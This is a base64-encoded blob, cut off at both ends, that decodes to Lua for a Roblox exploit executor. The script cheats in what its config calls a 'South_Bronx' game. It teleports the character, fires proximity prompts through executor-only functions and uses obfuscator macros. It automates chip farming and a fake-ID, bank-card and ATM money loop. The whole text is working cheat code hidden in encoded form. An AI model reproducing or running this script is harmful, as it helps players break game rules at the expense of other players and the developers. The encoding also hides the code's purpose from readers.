XBvcnRfU3RhdHVzID09ICJTdWNjZXNzIgoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDMpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oV29ya3NwYWNlLk5QQ3M6RmluZEZpcnN0Q2hpbGQoIlBvb3IgR3V5IikuSGVhZC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLk1vdmVUb0ZpbmlzaGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzWyJQb29yIEd1eSJdLlVwcGVyVG9yc28uUHJveGltaXR5UHJvbXB0KQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEyLjUpCgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBIb2JvID0gR2V0X0hvYm8oKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IEhvYm8gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIb2JvID0gR2V0X0hvYm8oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgSG9ibyB+PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICAgICAgVGVsZXBvcnRfU3RhdHVzID0gVGVsZXBvcnQoSG9iby5IZWFkLkNGcmFtZSkKCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBUZWxlcG9ydF9TdGF0dXMgPT0gIlN1Y2Nlc3MiIGFuZCB0cF9kZWJvdW5jZSA9PSBmYWxzZQoKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDUpCgogICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuVywgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuUywgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuQSwgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuRCwgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjI1KQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSG90IENoaXBzIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiSG90IENoaXBzIikpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKEhvYm86RmluZEZpcnN0Q2hpbGQoIlJpZ2h0TG93ZXJMZWciLCB0cnVlKS5Qb3NpdGlvbikKCiAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5Nb3ZlVG9GaW5pc2hlZDpXYWl0KCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg0KQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwcm9tcHQgPSBIb2JvOkZpbmRGaXJzdENoaWxkV2hpY2hJc0EoIlByb3hpbWl0eVByb21wdCIsIHRydWUpCgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KHByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCg1KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBTdG9wX0NoaXBGYXJtID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbm90IENoaXBGYXJtX1RocmVhZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIGlmIGNvcm91dGluZS5zdGF0dXMoQ2hpcEZhcm1fVGhyZWFkKSA9PSAic3VzcGVuZGVkIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoQ2hpcEZhcm1fVGhyZWFkKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxvY2FsIENhcmRGYXJtX1RocmVhZAoKICAgICAgICAgICAgU3RhcnRfQ2FyZEZhcm0gPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBDYXJkRmFybV9UaHJlYWQgPSB0YXNrLnNwYXduKExQSF9KSVRfTUFYKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSB0YXNrLndhaXQoMSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5Tb3V0aF9Ccm9ueC5GYXJtaW5nVXRpbGl0aWVzLkNhcmRGYXJtIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXIgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIENvbmZpZy5Tb3V0aF9Ccm9ueC5UZWxlcG9ydE1ldGhvZCB+PSAiVHdlZW4iIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBsYXllckhhc0NhcmQgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikgYW5kIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDYXJkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBUZWxlcG9ydF9TdGF0dXMgPSBUZWxlcG9ydChDRnJhbWUubmV3KDIxOSwgNCwgLTMzMikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIFdvcmtzcGFjZS5OUENzOkZpbmRGaXJzdENoaWxkKCJGYWtlSURTZWxsZXIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzLkZha2VJRFNlbGxlci5VcHBlclRvcnNvLkF0dGFjaG1lbnQ6RmluZEZpcnN0Q2hpbGQoIlByb3hpbWl0eVByb21wdCIpKSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpIG9yIExvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIFRlbGVwb3J0X1N0YXR1cyA9PSAiU3VjY2VzcyIKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBpZiBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiRmFrZSBJRCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJDYXJkIikgYW5kIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkNhcmQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRlbGVwb3J0X1N0YXR1cyA9IFRlbGVwb3J0KENGcmFtZS5uZXcoLTQ5LCA0LCAtMzIzKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIFdvcmtzcGFjZS5OUENzOkZpbmRGaXJzdENoaWxkKCJCYW5rIFRlbGxlciIpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSB1bnRpbCBUZWxlcG9ydF9TdGF0dXMgPT0gIlN1Y2Nlc3MiCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00OSwgNCwgLTMyMSkpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMi4xKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQXBwbGljYXRpb25fU3VjY2Vzc2Z1bCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIE9sZCA7IE9sZCA9IExvY2FsUGxheWVyLlBsYXllckd1aS5NYWluLk1lc3NhZ2UuV2FybmluZzpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlRleHQiKTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWFpbi5NZXNzYWdlLldhcm5pbmcuVGV4dDpmaW5kKCJhcHBsaWNhdGlvbiIpIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIExvY2FsUGxheWVyLlBsYXllckd1aS5NYWluLk1lc3NhZ2UuV2FybmluZy5UZXh0ID09ICJZb3VyIGFwcGxpY2F0aW9uIHdhcyBzdWNjZXNzZnVsLiBQbGVhc2UgYWxsb3cgMzAgc2Vjb25kcyBmb3IgdGhlIGJhbmsgdG8gcHJlcGFyZSB5b3VyIGNhcmQuIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXBwbGljYXRpb25fU3VjY2Vzc2Z1bCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwbGF5ZXJIYXNDYXJkID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFwcGxpY2F0aW9uX1N1Y2Nlc3NmdWwgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllckhhc0NhcmQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGlmIExvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKCJGYWtlIElEIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgdW50aWwgV29ya3NwYWNlLk5QQ3M6RmluZEZpcnN0Q2hpbGQoIkJhbmsgVGVsbGVyIikKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5OUENzOkZpbmRGaXJzdENoaWxkKCJCYW5rIFRlbGxlciIpLlVwcGVyVG9yc28uQXR0YWNobWVudDpGaW5kRmlyc3RDaGlsZCgiUHJveGltaXR5UHJvbXB0IikpIHRhc2sud2FpdCgpIHVudGlsIG5vdCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkZha2UgSUQiKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuTWFpbi5NZXNzYWdlLldhcm5pbmc6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJUZXh0Iik6V2FpdCgpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgT2xkOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoLjUpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBBcHBsaWNhdGlvbl9TdWNjZXNzZnVsID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEuNSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpNb3ZlVG8oVmVjdG9yMy5uZXcoLTQzLCA0LCAtMzMyKSkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjUpCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSBmaXJlcHJveGltaXR5cHJvbXB0KFdvcmtzcGFjZS5CbGFuay5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkgdW50aWwgTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNhcmQiKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGxheWVySGFzQ2FyZCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGVsZXBvcnRfU3RhdHVzID0gVGVsZXBvcnQoQ0ZyYW1lLm5ldygtNDksIDQsIC0zMjMpKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKSB1bnRpbCBXb3Jrc3BhY2UuTlBDczpGaW5kRmlyc3RDaGlsZCgiQmFuayBUZWxsZXIiKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIFRlbGVwb3J0X1N0YXR1cyA9PSAiU3VjY2VzcyIKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKFZlY3RvcjMubmV3KC00OSwgNCwgLTMyMSkpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDIuMSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhWZWN0b3IzLm5ldygtNDMsIDQsIC0zMzIpKQogICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMS41KQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIGZpcmVwcm94aW1pdHlwcm9tcHQoV29ya3NwYWNlLkJsYW5rLkF0dGFjaG1lbnQuUHJveGltaXR5UHJvbXB0KSB1bnRpbCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBsYXllckhhc0NhcmQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpIGFuZCBub3QgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJDYXJkIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIEFUTTsKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLk1hcC5BVE1TOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBWYWx1ZS5BVE1TY3JlZW4uVHJhbnNwYXJlbmN5ID09IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBBVE0gPSBWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBBVE0gPT0gbmlsIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBJbmRleCwgVmFsdWUgaW4gV29ya3NwYWNlLk1hcC5BVE1TOkdldENoaWxkcmVuKCkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgVmFsdWUuQVRNU2NyZWVuLlRyYW5zcGFyZW5jeSA9PSAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFUTSA9IFZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBBVE0gfj0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgVGVsZXBvcnRfU3RhdHVzID0gVGVsZXBvcnQoQVRNUG9zaXRpb25zW3Rvc3RyaW5nKEFUTSldKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpXYWl0KCkgdW50aWwgVGVsZXBvcnRfU3RhdHVzID09ICJTdWNjZXNzIgogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChMb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQ2FyZCIpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLVByZXNzS2V5KEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5XLCAuMjUpIHRhc2sud2FpdCguMjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuUywgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLkEsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5ELCAuMjUpIHRhc2sud2FpdCguMjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgxLjI1KQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOk1vdmVUbyhBVE0uQ0ZyYW1lLlBvc2l0aW9uKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgyLjUpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLVByZXNzS2V5KEVudW0uS2V5Q29kZS5MZWZ0U2hpZnQsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5XLCAuMjUpIHRhc2sud2FpdCguMjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQcmVzc0tleShFbnVtLktleUNvZGUuUywgLjI1KSB0YXNrLndhaXQoLjI1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgUHJlc3NLZXkoRW51bS5LZXlDb2RlLkEsIC4yNSkgdGFzay53YWl0KC4yNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByZXNzS2V5KEVudW0uS2V5Q29kZS5ELCAuMjUpIHRhc2sud2FpdCguMjUpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEuMjUpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJlcHJveGltaXR5cHJvbXB0KEFUTS5BdHRhY2htZW50LlByb3hpbWl0eVByb21wdCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6TW92ZVRvKEFUTS5DRnJhbWUuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIEFUTS5BVE1TY3JlZW4uVHJhbnNwYXJlbmN5ID09IDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIHVudGlsIExvY2FsUGxheWVyLlBsYXllckd1aTpGaW5kRmlyc3RDaGlsZCgiQVRNIikKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXJ2aWNlcy5WaXJ0dWFsVXNlcjpDYXB0dXJlQ29udHJvbGxlcigpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuQVRNLkZyYW1lLlN3aXBlLlBvc2l0aW9uID0gVURpbTIubmV3KC0zLjA3NDIwOTIsIDAsIC0wLjI3MDMzODk3NCwgMCkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMb2NhbFBsYXllci5QbGF5ZXJHdWkuQVRNLkZyYW1lLlN3aXBlLlNpemUgPSBVRGltMi5uZXcoMTAwMSArIFJhbmRvbS5uZXcoKTpOZXh0TnVtYmVyKDAuMSwgMSksIDAsIDEwMDEgKyBSYW5kb20ubmV3KCk6TmV4dE51bWJlcigwLjEsIDEpLCAwKQogICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6V2FpdCgpIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTG9jYWxQbGF5ZXIuUGxheWVyR3VpOkZpbmRGaXJzdENoaWxkKCJBVE0iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VydmljZXMuVmlydHVhbFVzZXI6Q2FwdHVyZUNvbnRyb2xsZXIoKSA7IAogICAgICAg